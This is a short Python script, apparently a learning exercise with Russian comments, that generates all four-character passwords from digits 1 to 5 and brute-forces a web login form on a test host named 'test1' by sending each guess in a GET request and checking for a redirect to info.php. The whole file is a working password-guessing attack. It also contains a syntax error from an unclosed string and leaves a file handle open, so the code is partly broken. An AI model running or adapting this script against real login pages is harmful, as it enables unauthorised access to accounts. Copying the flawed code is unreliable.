#test_commit
import urllib.request
import requests
import urllib.parse
import itertools
import time
import os
count=0

file_path="password.txt"
f=open('password.txt','w') #проверка ошибок
if os.path.exists(file_path):
    for i in itertools.product('12345',repeat=4):
        f.write(''.join(i))
        f.write('\n')
        count+=1
else:
    print("File error")
t1 = time.time()
f=open('password.txt')
if os.path.exists(file_path):
    
    for password in f:
        password=password[0:-1]
        data=[("login","test"),("password",password),("submit","submit")]
        enc_data=urllib.parse.urlencode(data)
        try:
            r = requests.get("http://test1/login.php")#проверка доступности сайта
            r=r.status_code
        except Exception:
                print("Ошибка)
        if r!=200:#проверка доступности сайта
            print("Сайт недоступен")
            exit()
        else:
            a=urllib.request.urlopen("http://test1/login.php"+"?" +enc_data) 
            #print(str((a.read()),'UTF-8'))
            x=a.geturl()
            if (x=="http://test1/info.php"):
                print("Password is: ",password)
                break
    
    print("Перебор занял",time.time() - t1,"секунд")
    print("Кол-во возможных паролей",count)
    f.close()               
else:
    print("File error")
